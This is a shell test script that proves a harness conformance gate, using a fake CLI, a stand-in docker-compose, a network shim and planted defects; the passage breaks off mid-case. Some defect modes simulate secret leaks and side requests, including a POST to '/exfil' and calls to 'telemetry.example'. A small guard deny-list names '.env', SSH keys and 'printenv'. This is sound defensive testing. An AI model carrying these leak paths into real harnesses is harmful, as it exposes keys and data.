#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
#
# harness-conformance-proof: gates/harness-conformance.sh can fail
# (CLAUDE.md: a gate that cannot fail is not a gate), and it can pass,
# without an engine, a key or a real CLI. The suite is run, whole, on a copy
# of the tree that holds one made-up CLI harness, `fake-cli`, and a
# `docker-compose` that is a shell function in disguise:
#   - fake-cli is a pure adapter: a run.sh that honours the contract of
#     docs/adr/0041 (the refusal of another provider, the artefacts, the
#     stop lines, MODEL_BASE_URL) around a ~100-line client that speaks
#     Anthropic Messages to the scripted model and calls the guard before
#     every tool, as Claude Code's PreToolUse hook does. No container.
#   - the stand-in `docker-compose` answers the six calls the suite makes:
#     `config`, `build`, `up -d conformance-model` (starts stub.py on a local
#     port), `rm -sf conformance-model` (stops it), `logs` and `run` (refused:
#     fake-cli never uses it, so a run.sh that calls it is a run.sh that
#     started a container).
# The good fake must reach GO. Each defect below is one way a real harness can
# be wrong; the suite must refuse it, with a NO-GO naming the case it
# belongs to. So the proof is also a record of what each case catches.
#
# Confinement (docs/adr/0046) is proved the same way, with stand-ins for what
# an engine would give: the stand-in `docker-compose` starts the real
# core/egress.py (through egress_wrap.py, which gives it names and a source
# address of its own, 127.0.0.2, the one the stub then sees) and answers `exec`
# in the stub's container; and fake-cli, with the probe it runs, executes under
# a sitecustomize that plays the harness container's network: the proxy is
# reachable, every other address is not, and `egress` is the only name that
# resolves. A defect is a hole in that stand-in network or in the proxy's
# list. The probe is also proved channel by channel on its own, before the
# suite runs: each of its eight ways is opened alone and must be the one that
# reads `open`.
#
# The stand-ins listen on local ports the proof picks, and one picker serves
# them all: it is proved first, under the load the proxy's own sockets put on
# the kernel's port allocator, to hand out only ports its listeners can bind
# (a picker that asked on 127.0.0.1 failed one podman run in twenty, the
# stub's 60 s wait, and two docker ones, the proxy's).
#
# Run by `make harness-conformance` before the suite judges any real harness
# (the judge is judged first, as ci/prompts.sh proves its checker on planted
# files before reading roles/). Not a ci/ check: it starts the stub and
# fake-cli about thirty times, two and a half minutes of `./go ci` that
# ci/contract.sh would spend twice, and it needs the suite's own files, not
# the repository's.
#
# It is not a conformance run of any real harness and says nothing of one:
# fake-cli proves the suite, never an adapter. What it cannot prove without an
# engine: the internal network itself (the stand-in says what it blocks; only
# docker or podman route, or do not), DNS (the stand-in answers `egress` and
# nothing else, which is what a real internal network is meant to do and the
# thing that CVE-2024-29018 broke), the container's real peer address (127.0.0.2
# stands in for egress's, and a made-up `exec` for resolving it from the stub's
# side), a real CLI honouring HTTP_PROXY and NO_PROXY, and the container side of
# run.sh. Those are case 9 on docker in GitHub Actions and, once, on rootless
# podman. Nor the stub against the real CLIs' wire (the L0 suite of ADR 0041
# does, once a harness exists).
set -eu
name=harness-conformance-proof
. ci/lib.sh

# `make harness-conformance` may carry the caller's choices; none of them is the proof's.
unset CONFORMANCE_HARNESS CONFORMANCE_PORT CONFORMANCE_TIMEOUT_S PROOF_COMPOSE_JSON FAKE_DEFECT

for tool in python3 jq git; do
  command -v "$tool" >/dev/null 2>&1 || nogo "$tool is not on PATH"
done
# The stand-in for egress's own address (see the header): bindable on Linux, the
# workbench; not on a host where only 127.0.0.1 is on the loopback.
python3 -c 'import socket; socket.socket().bind(("127.0.0.2", 0))' 2>/dev/null \
  || nogo "127.0.0.2 is not bindable here, and the proof uses it as egress's address; run it in the workbench (./go harness-conformance)"

work=$(mktemp -d)
# shellcheck disable=SC2329 # invoked by name via `trap` below, not called directly
cleanup() {
  ec=$?
  # The stand-in compose starts the proxy and the probe's stub in the background;
  # the suite removes them on exit, and this is for a run that was cut short.
  for f in "$work"/tree/.proof/*.pid "$work"/probe/*.pid; do
    [ ! -f "$f" ] || kill "$(cat "$f")" 2>/dev/null || :
  done
  rm -rf "$work"
  exit "$ec"
}
trap cleanup EXIT INT TERM

# --- the stand-in docker-compose ------------------------------------------------
# The calls the suite and core/egress.sh make: config, build, up -d (the scripted
# model; egress), ps -q egress, rm -sf (both), logs (egress), exec -T
# conformance-model. The proxy is the real core/egress.py on a free local port,
# detached as an engine would run it (stdout and stdin closed, stderr in a file:
# a child holding run.sh's pipe would hang the suite's `tee`).
mkdir -p "$work/bin"
# The one port picker, for every listener the proof starts (stub.py and
# core/egress.py, both on 0.0.0.0). It asks the kernel for a port free on the
# address the listener will bind, 0.0.0.0: a port picked on 127.0.0.1 can be
# held, or in TIME_WAIT, on 127.0.0.2, where egress_wrap.py binds the proxy's
# outgoing sockets from the same allocator, and the listener's bind then fails
# with EADDRINUSE (the stub's 60 s wait in the suite, the proxy's 30 s in
# core/egress.sh). A pick is only taken while no proxy runs, so nothing takes
# the port between the pick and the bind. Proved below, under the proxy's load.
cat > "$work/bin/freeport" <<'PICK'
#!/bin/sh
exec python3 -c 'import socket; s = socket.socket(); s.bind(("0.0.0.0", 0)); print(s.getsockname()[1])'
PICK
chmod +x "$work/bin/freeport"
cat > "$work/bin/docker-compose" <<'SHIM'
#!/bin/sh
# Answers the suite's compose calls from the proof's tree (cwd), stub.py on a local port.
args=" $* "
state=$PWD/.proof
alive() { [ -f "$state/egress.pid" ] && kill -0 "$(cat "$state/egress.pid")" 2>/dev/null; }
case "$args" in
  *" exec "*)
    # `exec -T conformance-model python3 -c CODE ARG...`: CODE run with the names the
    # stub's own network would give: egress is 127.0.0.2 (the address the stub then
    # sees the proxy connect from), the stub itself an address a harness cannot reach.
    while [ "$1" != python3 ]; do shift; done
    shift
    [ "$1" = -c ] || exit 97
    code=$2
    shift 2
    exec python3 -c 'import socket, sys
names = {"egress": "127.0.0.2", "conformance-model": "10.9.0.3", "conformance-sink": "10.9.0.3"}
real = socket.gethostbyname
socket.gethostbyname = lambda n: names[n] if n in names else real(n)
code = sys.argv[1]
sys.argv = ["-c"] + sys.argv[2:]
exec(code)' "$code" "$@" ;;
  *" config "*)
    if [ -n "${PROOF_COMPOSE_JSON:-}" ]; then
      printf '%s\n' "$PROOF_COMPOSE_JSON"
    else
      printf '{"services":{"conformance-model":{"networks":{"default":{"aliases":["conformance-sink"]}}},"egress":{},"fake-cli":{}}}\n'
    fi ;;
  *" up "*" conformance-model "*)
    STUB_WORK="$PWD/.crew/conformance/model" python3 -I gates/harness-conformance/stub.py "$CONFORMANCE_PORT" 2>"$PWD/.crew/conformance/stub.err" &
    echo $! > "$PWD/.crew/conformance/stub.pid" ;;
  *" up "*" egress "*)
    mkdir -p "$state" "$PWD/.crew/egress"
    alive && exit 0
    port=$("$(dirname "$0")/freeport")
    echo "$port" > "$state/egress.port"
    EGRESS_DIR="$PWD/.crew/egress" python3 proof-egress.py "$port" >/dev/null 2>>"$state/egress.err" </dev/null &
    echo $! > "$state/egress.pid" ;;
  *" ps "*)
    # An engine's container id is 64 hex characters; the proxy writes its first 12.
    ! alive || printf 'proofegress1%052d\n' 0 ;;
  *" rm "*" egress "*)
    mkdir -p "$state"
    echo removed >> "$state/egress.removed"
    ! alive || kill "$(cat "$state/egress.pid")" 2>/dev/null || :
    rm -f "$state/egress.pid" ;;
  *" rm "*)
    [ ! -f "$PWD/.crew/conformance/stub.pid" ] || kill "$(cat "$PWD/.crew/conformance/stub.pid")" 2>/dev/null || : ;;
  *" logs "*" egress "*)
    sed 's/^/egress-1  | /' "$state/egress.err" 2>/dev/null || : ;;
  *" logs "*" conformance-model "*)
    sed 's/^/conformance-model-1  | /' "$PWD/.crew/conformance/stub.err" 2>/dev/null || : ;;
  *" build "*|*" logs "*) : ;;
  *)
    echo "docker-compose $*" >> "${PROOF_INVOKED:?}"
    exit 97 ;;
esac
exit 0
SHIM
chmod +x "$work/bin/docker-compose"
# The workbench has sha256sum; the host this may also run on may not.
if ! command -v sha256sum >/dev/null 2>&1; then
  printf '#!/bin/sh\nexec shasum -a 256 "$@"\n' > "$work/bin/sha256sum"
  chmod +x "$work/bin/sha256sum"
fi

# --- fake-cli: the made-up harness -----------------------------------------------
fake=$work/fake
mkdir -p "$fake"

cat > "$fake/run.sh" <<'RUN'
#!/bin/sh
# fake-cli's run.sh: the adapter contract of docs/adr/0041, minus the container.
# FAKE_DEFECT names the one thing it does wrong, if any.
set -eu
: "${ROLE:?}" "${TICKET:?}" "${WORKSPACE:?}" "${BASE:?}" "${OUT:?}" "${TICKET_FILE:?}"
: "${THINKING:?}" "${MAX_TURNS:?}" "${TIMEOUT_S:?}" "${TOKEN_BUDGET:?}"
defect=${FAKE_DEFECT:-}
here=$(cd "$(dirname "$0")" && pwd)

if [ "$defect" = late-refusal ]; then docker-compose --profile crew run --rm fake-cli >&2 || :; fi
if [ "${MODEL_PROVIDER:-}" != anthropic ] && [ "$defect" != no-refusal ]; then
  [ "$defect" != more-lines ] || printf 'harness-fake-cli: starting up\n' >&2
  printf 'harness-fake-cli: MODEL_PROVIDER=%s needs the codex or gemini-cli harness; this harness runs anthropic only\n' "${MODEL_PROVIDER:-}" >&2
  exit 1
fi

# The one way out of the internal network (docs/adr/0046 §4), as every real run.sh
# asks for it: after its refusals, before it runs the container.
sh core/egress.sh "$(grep '^EGRESS=' "$here/conformance.env" | head -n1 | cut -d= -f2-)" || exit 1
port=${MODEL_BASE_URL##*:}
case "$defect" in
  allow-sink|sink-touch) printf 'conformance-sink:%s\n' "$port" >> .crew/egress/allow ;;
  allow-model-port) printf 'conformance-model:%s\n' "$((port + 1))" >> .crew/egress/allow ;;
  allow-example) printf 'example.com:443\n' >> .crew/egress/allow ;;
  side-host) printf 'telemetry.example:%s\n' "$port" >> .crew/egress/allow ;;
esac
# What compose gives the container: the proxy variables, and a network that only
# reaches the proxy (netshim/sitecustomize.py). A defect is a hole in that network.
export HTTP_PROXY=http://egress:3128 HTTPS_PROXY=http://egress:3128 http_proxy=http://egress:3128 https_proxy=http://egress:3128
export NETSHIM_EGRESS_PORT NETSHIM_STUB_PORT PYTHONPATH NETSHIM_OPEN
NETSHIM_EGRESS_PORT=$(cat .proof/egress.port)
NETSHIM_STUB_PORT=$port
PYTHONPATH=$here/netshim
case "$defect" in
  direct-model) NETSHIM_OPEN="dns-model tcp-stub" ;;
  open-dns) NETSHIM_OPEN=dns-public ;;
  open-public) NETSHIM_OPEN=tcp-public ;;
  open-sink-direct) NETSHIM_OPEN="dns-sink tcp-stub" ;;
  *) NETSHIM_OPEN="" ;;
esac

effort=$(grep "^ANTHROPIC_$(printf '%s' "$THINKING" | tr '[:lower:]' '[:upper:]')=" "$here/thinking.env" | cut -d= -f2)
mkdir -p "$OUT"
[ "$defect" != key-in-probe-case ] || [ ! -f "$WORKSPACE/probe.py" ] || printf '%s\n' "$FAKE_KEY_VALUE" > "$OUT/leak.log"
sha=$(sha256sum "$TICKET_FILE" | cut -d' ' -f1)
start=$(date +%s)
rc=0
FAKE_EFFORT=$effort FAKE_KEY=$FAKE_KEY_VALUE FAKE_GUARD="$here/hooks/guard.sh" \
  python3 "$here/fake_cli.py" > "$OUT/transcript.json" 2> "$OUT/stderr.log" || rc=$?
duration=$(($(date +%s) - start))

if [ "$rc" -ne 0 ]; then
  stop=$(cat "$OUT/stop" 2>/dev/null || true)
  case "$stop" in
    MAX_TURNS) reason="over MAX_TURNS ($MAX_TURNS)" ;;
    TOKEN_BUDGET) reason="over TOKEN_BUDGET ($TOKEN_BUDGET)" ;;
    TIMEOUT_S) reason="over TIMEOUT_S ($TIMEOUT_S s)" ;;
    *) reason="fake-cli exited $rc: $(tail -n 1 "$OUT/stderr.log")" ;;
  esac
  [ "$defect" != wrong-stop-phrase ] || reason="stopped: budget"
  [ "$defect" != key-on-stop ] || printf '%s\n' "$FAKE_KEY_VALUE" > "$OUT/stop.log"
  printf 'harness-fake-cli: %s\n' "$reason" >&2
  exit 1
fi

final=$(jq -r '.final' "$OUT/transcript.json")
printf '%s\n' "$final" > "$OUT/final.md"
title=$(printf '%s\n' "$final" | head -n1)
body=$(printf '%s\n' "$final" | tail -n +2 | sed '/./,$!d')
jq -n --arg title "$title" --arg body "$body" '{title: $title, body: $body}' > "$OUT/pr.json"
git -C "$WORKSPACE" add -A
git -C "$WORKSPACE" -c user.name=lights-out-crew -c user.email=crew@lights-out.invalid commit -q -m "$title" -m "$body"
git -C "$WORKSPACE" format-patch --stdout "$BASE"..HEAD > "$OUT/patch"
served=$(jq -r '.served' "$OUT/transcript.json")
[ "$defect" != raw-model ] || served=$MODEL
tokens=$(jq -r '.tokens' "$OUT/transcript.json")
[ "$defect" != tokens-doubled ] || tokens=$((tokens * 2))
jq -n --arg harness fake-cli --arg provider "$MODEL_PROVIDER" --arg model "$served" --arg thinking "$THINKING" \
  --argjson turns "$(jq '.turns' "$OUT/transcript.json")" --arg insha "$sha" --argjson tokens "$tokens" \
  --argjson duration "$duration" --arg endpoint "${MODEL_BASE_URL:-}" \
  '{harness: $harness, provider: $provider, model: $model, thinking: $thinking, turns: $turns,
    tokens: {input: ($tokens * 9 / 10 | floor), output: ($tokens / 10 | floor), total: $tokens},
    duration_s: $duration, exit_code: 0, input_sha256: $insha, endpoint: $endpoint}' > "$OUT/run.json"
if [ "$defect" = no-endpoint ]; then
  jq 'del(.endpoint)' "$OUT/run.json" > "$OUT/run.json.new"
  mv "$OUT/run.json.new" "$OUT/run.json"
fi
exit 0
RUN

cat > "$fake/fake_cli.py" <<'PY'
"""fake-cli: a made-up coding CLI that speaks Anthropic Messages to the scripted model,
calls the guard before every tool as a PreToolUse hook, and keeps the budgets."""
import json, os, signal, subprocess, sys, urllib.error, urllib.request

env = os.environ
defect = env.get("FAKE_DEFECT", "")
base = env["MODEL_BASE_URL"]
# Honours the proxy the container's environment names; `direct-model` does not.
opener = urllib.request.build_opener(urllib.request.ProxyHandler({} if defect == "direct-model" else {"http": env["HTTP_PROXY"]}))
out, workspace, model = env["OUT"], env["WORKSPACE"], env["MODEL"]
max_turns, budget, timeout_s = int(env["MAX_TURNS"]), int(env["TOKEN_BUDGET"]), int(env["TIMEOUT_S"])
crew = os.path.join(os.getcwd(), ".crew")


def stop(why, code):
    open(os.path.join(out, "stop"), "w").write(why)
    sys.exit(code)


def on_alarm(*_):
    stop("TIMEOUT_S", 124)


signal.signal(signal.SIGALRM, on_alarm)
signal.alarm(timeout_s)

prompt = open("roles/%s/prompt.md" % env["ROLE"]).read()
ticket = open(env["TICKET_FILE"]).read()
system = None if defect == "no-prompt" else prompt
messages = [{"role": "user", "content": ticket}]
tools = [{"name": n} for n in ("Bash", "Read", "Write")]
tokens = turns = 0
served = ""
secret = env["FAKE_KEY"]


def host_path(p):
    return crew + "/" + p[len("/crew/"):] if p.startswith("/crew/") else p


def guarded(name, tool_input):
    hook = json.dumps({"hook_event_name": "PreToolUse", "tool_name": name, "tool_input": tool_input},
                      separators=(",", ":"))
    r = subprocess.run(["sh", env["FAKE_GUARD"]], input=hook, capture_output=True, text=True,
                       env=dict(env, CREW_OUT=out))
    return r.returncode == 2, r.stderr


def side_request():
    """One more request than the model's, through the proxy: what a harness that
    talks to a host of its own, or to the sink, or posts to /exfil, would do."""
    method, host, path = {"sink-touch": ("GET", "conformance-sink", "/ping"),
                          "exfil-path": ("POST", "conformance-model", "/exfil"),
                          "side-host": ("GET", "telemetry.example", "/ping")}.get(defect, (None, None, None))
    if method:
        req = urllib.request.Request("http://%s:%s%s" % (host, env["CONFORMANCE_PORT"], path),
                                     b"x" if method == "POST" else None, method=method)
        try:
            opener.open(req).read()
        except Exception:
            pass


def run_tool(name, tool_input):
    if name == "Bash":
        # `probe-cut-off`: the tool's subprocess cannot reach the proxy (netshim reads NETSHIM_CUT).
        tool_env = dict(env, NETSHIM_CUT="1") if defect == "probe-cut-off" else None
        r = subprocess.run(["sh", "-c", tool_input["command"]], cwd=workspace, capture_output=True, text=True, timeout=60,
                           env=tool_env)
        text = r.stdout + r.stderr
        # `cut-output`: a tool result that keeps only its first three lines.
        return "\n".join(text.splitlines()[:3]) if defect == "cut-output" else text
    if name == "Read":
        return open(host_path(tool_input["file_path"])).read()
    with open(host_path(tool_input["file_path"]), "w") as f:
        f.write(tool_input["content"])
    return "written"


side_request()
while True:
    if turns >= max_turns and defect != "no-turn-limit":
        stop("MAX_TURNS", 1)
    body = {"model": model, "max_tokens": 4096, "messages": messages, "tools": tools, "stream": False}
    if system:
        body["system"] = system
    if defect != "no-thinking":
        body["output_config"] = {"effort": env["FAKE_EFFORT"]}
    if defect == "key-in-body":
        body["metadata"] = {"user_id": secret}
    req = urllib.request.Request(base + "/v1/messages?beta=true", json.dumps(body).encode(),
                                 {"content-type": "application/json", "x-api-key": secret})
    try:
        resp = json.load(opener.open(req))
    except urllib.error.HTTPError as e:
        sys.exit("model said %s: %s" % (e.code, e.read().decode()[:200]))
    turns += 1
    served = resp["model"]
    tokens += resp["usage"]["input_tokens"] + resp["usage"]["output_tokens"]
    uses = [b for b in resp["content"] if b["type"] == "tool_use"]
    if not uses:
        text = "".join(b.get("text", "") for b in resp["content"])
        print(json.dumps({"final": text, "served": served, "turns": turns, "tokens": tokens}))
        break
    messages.append({"role": "assistant", "content": resp["content"]})
    results = []
    for u in uses:
        denied, why = (False, "")
        if defect != "no-hook":
            denied, why = guarded(u["name"], u["input"])
        if defect == "log-only":
            denied = False
        if denied:
            results.append({"type": "tool_result", "tool_use_id": u["id"], "is_error": True,
                            "content": "PreToolUse hook error: " + why})
        else:
            results.append({"type": "tool_result", "tool_use_id": u["id"], "content": run_tool(u["name"], u["input"])})
    messages.append({"role": "user", "content": results})
    if tokens >= budget and defect != "no-token-limit":
        stop("TOKEN_BUDGET", 1)
PY

# fake-cli's guard: enough of a deny-list for the suite's probes, in the real
# guard's output contract (exit 2 and a reason on stderr; a hooks.log line per
# call, `ALLOW <tool> -` or `DENY <tool> <label>`), and forking nothing, because
# the hook runs before every tool of every case. It is not the real guard,
# which ci/hooks.sh judges; this proof must not wait on it.
cat > "$fake/guard.sh" <<'GUARD'
#!/bin/sh
input=$(cat)
tool=${input#*\"tool_name\":\"}
tool=${tool%%\"*}
log=${CREW_OUT:-.}/hooks.log
deny() {
  printf 'DENY %s %s\n' "$tool" "$1" >> "$log"
  printf 'denied: matched %s\n' "$1" >&2
  exit 2
}
case $input in
  *git*push*) deny "git push" ;;
  *.env*) deny ".env" ;;
  *id_ed25519*) deny "id_ed25519" ;;
  *.key*) deny ".key" ;;
  *printenv*) deny "printenv" ;;
esac
printf 'ALLOW %s -\n' "$tool" >> "$log"
exit 0
GUARD

# --- the stand-ins for what an engine gives the harness and the proxy ----------------
# The proxy: core/egress.py itself, with the names an engine's DNS would answer
# for it, and 127.0.0.2 as the address its outgoing connections come from, so
# that the stub can tell the proxy from anything else on this machine. An
# unknown name does not resolve, as on a real network; example.com maps to
# nothing that listens, so an allowlist that let it through reads as a 502.
cat > "$fake/egress_wrap.py" <<'PY'
import socket, sys, runpy

NAMES = {"conformance-model": "127.0.0.1", "conformance-sink": "127.0.0.1",
         "telemetry.example": "127.0.0.1", "example.com": "127.0.0.1"}
real = socket.create_connection


def create_connection(address, timeout=None, source_address=None, **kw):
    host, port = address
    if host not in NAMES:
        raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")
    return real((NAMES[host], port), timeout, ("127.0.0.2", 0))


socket.create_connection = create_connection
socket.gethostname = lambda: "proofegress1"
sys.argv = ["egress.py", sys.argv[1]]
runpy.run_path("core/egress.py", run_name="__main__")
PY

# The harness container's network, for any Python it runs (fake_cli.py and the
# probe the model has it run): internal, so nothing routes but the proxy, and
# `egress` is the only name DNS answers. NETSHIM_OPEN lists holes, each the
# stand-in for one real defect: dns-sink, dns-model, dns-public (a name resolves
# that should not); tcp-stub (the stub's address is reachable), tcp-public
# (1.1.1.1:443 is). NETSHIM_CUT, set for the probe alone, makes the proxy
# unreachable from it: a probe that proves nothing.
mkdir -p "$fake/netshim"
cat > "$fake/netshim/sitecustomize.py" <<'PY'
import errno, os, socket

HOLES = set(os.environ.get("NETSHIM_OPEN", "").split())
EGRESS, STUB = ("10.9.0.2", 3128), "10.9.0.3"
NAMES = {"egress": EGRESS[0]}
if "dns-sink" in HOLES:
    NAMES["conformance-sink"] = STUB
if "dns-model" in HOLES:
    NAMES["conformance-model"] = STUB
if "dns-public" in HOLES:
    NAMES["example.com"] = "93.184.216.34"
real_getaddrinfo, real_connect = socket.getaddrinfo, socket.socket.connect


def is_address(host):
    try:
        socket.inet_aton(host)
        return True
    except OSError:
        return False


def getaddrinfo(host, *args, **kwargs):
    if isinstance(host, str) and host in NAMES:
        host = NAMES[host]
    elif isinstance(host, str) and not is_address(host):
        raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")
    return real_getaddrinfo(host, *args, **kwargs)


def connect(self, address):
    host, port = address[0], address[1]
    real = None
    if (host, port) == EGRESS and "NETSHIM_CUT" not in os.environ:
        real = ("127.0.0.1", int(os.environ["NETSHIM_EGRESS_PORT"]))
    elif host == STUB and "tcp-stub" in HOLES:
        real = ("127.0.0.1", port)
    elif (host, port) == ("1.1.1.1", 443) and "tcp-public" in HOLES:
        real = ("127.0.0.1", int(os.environ["NETSHIM_STUB_PORT"]))
    if real is None:
        raise OSError(errno.ENETUNREACH, "Network is unreachable")
    return real_connect(self, real)


socket.getaddrinfo, socket.socket.connect = getaddrinfo, connect
PY

# --- the tree the suite runs in ---------------------------------------------------
# build_tree DIR: a copy of what the suite reads, plus fake-cli.
build_tree() {
  t=$1
  mkdir -p "$t/gates" "$t/ci" "$t/core" "$t/roles" "$t/adapters/fake-cli/hooks" "$t/.crew"
  cp gates/harness-conformance.sh "$t/gates/"
  cp -R gates/harness-conformance "$t/gates/harness-conformance"
  cp ci/lib.sh "$t/ci/"
  cp core/harness-check.sh core/egress.sh core/egress.py "$t/core/"
  cp "$fake/egress_wrap.py" "$t/proof-egress.py"
  cp -R roles/dev-worker "$t/roles/dev-worker"
  cp "$fake/run.sh" "$fake/fake_cli.py" "$t/adapters/fake-cli/"
  cp -R "$fake/netshim" "$t/adapters/fake-cli/netshim"
  cp "$fake/guard.sh" "$t/adapters/fake-cli/hooks/guard.sh"
  printf '{}\n' > "$t/adapters/fake-cli/package-lock.json"
  printf 'FROM scratch\n' > "$t/adapters/fake-cli/Containerfile"
  printf 'ANTHROPIC_LOW=low\nANTHROPIC_MEDIUM=medium\nANTHROPIC_HIGH=high\n' > "$t/adapters/fake-cli/thinking.env"
  printf 'PROVIDER=anthropic\nMODEL=fake-model-1\nKEY_VAR=FAKE_KEY_VALUE\nTHINKING_PATH=.output_config.effort\nEGRESS=api.fake-provider.example:443\n' > "$t/adapters/fake-cli/conformance.env"
}

# --- the port picker, under the proxy's load -------------------------------------
# Every port the picker hands out must bind the way its listener binds it
# (stub.py: ThreadingHTTPServer on 0.0.0.0; core/egress.py: SO_REUSEADDR on
# 0.0.0.0) while the proxy's outgoing sockets hold ports on 127.0.0.2. The load
# is planted as the proxy leaves it: connections from ("127.0.0.2", 0) that close
# first, so each stays in TIME_WAIT for the kernel's 60 s. How much and how many
# picks (decisions, against a measurement in the workbench on 2026-11-11): a
# quarter of the ephemeral range, which bind(0) fills on one parity first, so
# about half of the ports a pick is offered are held; a picker that asks on
# 127.0.0.1 then landed on a held port 95 times in 200 picks, so 20 picks miss
# that defect with a chance near one in a million. The planting took 0.4 s.
freeport() {
  "$work/bin/freeport"
}

python3 -I - "$work/bin/freeport" <<'PY' || nogo "the port picker handed out a port its listener cannot bind (the proof's freeport)"
import socket, subprocess, sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

lo, hi = map(int, open("/proc/sys/net/ipv4/ip_local_port_range").read().split())
sink = socket.socket()
sink.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sink.bind(("127.0.0.1", 0))
sink.listen(128)
held = set()
for _ in range((hi - lo + 1) // 4):
    c = socket.create_connection(sink.getsockname(), 5, ("127.0.0.2", 0))
    held.add(c.getsockname()[1])
    a, _ = sink.accept()
    c.close()
    a.close()
sink.close()
for i in range(20):
    port = int(subprocess.run([sys.argv[1]], capture_output=True, text=True, check=True).stdout)
    try:
        ThreadingHTTPServer(("0.0.0.0", port), BaseHTTPRequestHandler).server_close()
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.close()
    except OSError as e:
        sys.exit("pick %d of 20: port %d, %s the %d the proxy's sockets hold: %s"
                 % (i + 1, port, "one of" if port in held else "not one of", len(held), e))
PY

# --- the probe, one way out at a time -------------------------------------------
# Without the suite: the real stub and the real proxy (egress_wrap.py) on local
# ports, the probe under the stand-in network, one hole opened at a time. The
# expected output is exact: eight lines, and nothing else, never what the probe
# read. This is what keeps each of the probe's eight ways honest; the suite-level
# defects further down only need one hole each.

probe_secret="probe-secret-$$-$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')"

probe_out() {  # HOLES [CUT]: the probe's whole stdout, run as the model's tool would
  env NETSHIM_OPEN="$1" NETSHIM_EGRESS_PORT="$proxy_port" NETSHIM_STUB_PORT="$stub_port" \
    HTTP_PROXY=http://egress:3128 PYTHONPATH="$fake/netshim" FAKE_KEY_VALUE="$probe_secret" ${2:+"NETSHIM_CUT=1"} \
    python3 gates/harness-conformance/probe.py 10.9.0.3 "$stub_port" 2>"$pd/probe.err"
}

expected_lines() {  # OPEN_LETTERS: what the probe must print
  for c in a b c d e f g h; do
    case " $1 " in
      *" $c "*) printf 'egress-probe %s open\n' "$c" ;;
      *) printf 'egress-probe %s blocked\n' "$c" ;;
    esac
  done
}

# probe_must NAME OPEN_LETTERS HOLES EXTRA_ALLOW [CUT]: with the allowlist holding the
# model's host:port and EXTRA_ALLOW (one host:port per line), HOLES open in the stand-in
# network, exactly OPEN_LETTERS must read `open`.
probe_must() {
  printf 'conformance-model:%s\n%s\n' "$stub_port" "$4" > "$pd/egress/allow"
  got=$(probe_out "$3" "${5:-}") || nogo "the probe crashed ($1)" "$(cat "$pd/probe.err")"
  want=$(expected_lines "$2")
  case "$got" in
    *"$probe_secret"*) nogo "the probe printed what it read ($1)" "$got" ;;
  esac
  [ "$got" = "$want" ] || nogo "the probe's verdict is wrong ($1)" "wanted:" "$want" "got:" "$got" "$(cat "$pd/probe.err")"
}

probe_proof() {
  pd=$work/probe
  mkdir -p "$pd/stub" "$pd/egress"
  printf '{"case":"probe/1","cwd":"/w","steps":[{"op":"final","text":"x"}]}\n' > "$pd/stub/case.json"
  stub_port=$(freeport)
  CONFORMANCE_CANARY=probe-stub-key STUB_WORK="$pd/stub" python3 -I gates/harness-conformance/stub.py "$stub_port" >/dev/null 2>&1 </dev/null &
  echo $! > "$pd/stub.pid"
  waited=0
  while [ ! -f "$pd/stub/ready" ]; do
    waited=$((waited + 1))
    [ "$waited" -le 20 ] || nogo "the stub did not start for the probe's proof"
    sleep 1
  done
  proxy_port=$(freeport)
  EGRESS_DIR="$pd/egress" python3 "$fake/egress_wrap.py" "$proxy_port" >/dev/null 2>"$pd/egress.err" </dev/null &
  echo $! > "$pd/egress.pid"
  waited=0
  while [ ! -f "$pd/egress/ready" ]; do
    waited=$((waited + 1))
    [ "$waited" -le 20 ] || nogo "the proxy did not start for the probe's proof" "$(cat "$pd/egress.err")"
    sleep 1
  done

  probe_must "every way shut" "" "" ""
  probe_must "the proxy's list holds the sink" "a b" "" "conformance-sink:$stub_port"
  # The leak is recorded where the suite will look: on the sink's name, from the proxy's address.
  jq -se '[.[] | select(.sink == true and .path == "/exfil" and .peer == "127.0.0.2")] | length >= 2' \
    "$pd/stub/probe/1/requests.jsonl" >/dev/null \
    || nogo "the stub did not record the probe's leak through the proxy (sink, /exfil, the proxy's address)"
  # An error page is an answer, not a refusal: with no case the stub answers 503.
  mv "$pd/stub/case.json" "$pd/stub/case.json.off"
  probe_must "a server's error page is not a refusal" "a b" "" "conformance-sink:$stub_port"
  mv "$pd/stub/case.json.off" "$pd/stub/case.json"
  probe_must "the list holds the model's name on another port" "c" "" "conformance-model:$((stub_port + 1))"
  probe_must "the list holds example.com" "d" "" "example.com:443"
  probe_must "the stub's address is reachable" "f" "tcp-stub" ""
  probe_must "the sink's name resolves and its address is reachable" "e f" "dns-sink tcp-stub" ""
  jq -se '[.[] | select(.path == "/exfil" and .peer == "127.0.0.1")] | length >= 2' \
    "$pd/stub/probe/1/requests.jsonl" >/dev/null \
    || nogo "the stub did not record the probe's direct leak (/exfil from an address that is not the proxy's)"
  probe_must "1.1.1.1:443 is reachable" "g" "tcp-public" ""
  probe_must "example.com resolves" "h" "dns-public" ""
  probe_must "the proxy cannot be reached: nothing is open, and the suite must notice nothing was tried" "" "" "" cut

  for f in "$pd"/stub.pid "$pd"/egress.pid; do kill "$(cat "$f")" 2>/dev/null || :; done
}
probe_proof

# prove NAME DEFECT WANT: run the suite on a fresh tree with DEFECT; WANT is
# "GO" or the text a NO-GO line must contain after the gate's name.
prove() {
  t=$work/tree
  rm -rf "$t"
  build_tree "$t"
  [ -z "${tweak:-}" ] || "$tweak" "$t"
  rm -f "$work/invoked"
  proved=$((proved + 1))
  errfile=$work/run-$proved.err
  port=$(freeport)
  verdict=$(cd "$t" && PATH="$work/bin:$PATH" PROOF_INVOKED="$work/invoked" CONFORMANCE=1 CONFORMANCE_PORT="$port" \
    CONFORMANCE_TIMEOUT_S=2 PROOF_COMPOSE_JSON="${compose_json:-}" WORKBENCH_IMAGE=proof COMPOSE_FILE=compose.yaml WORKLOAD=w WORKLOAD_CONTRACT=w/c \
    FAKE_DEFECT="$2" sh gates/harness-conformance.sh 2> "$errfile") && rc=0 || rc=$?
  # Whatever the verdict, the suite leaves no proxy behind (docs/adr/0046: it removes
  # `egress` on exit, like the scripted model).
  [ ! -f "$t/.proof/egress.pid" ] || nogo "the suite left the egress proxy running ($1)"
  case "$3" in
    GO)
      case "$verdict" in
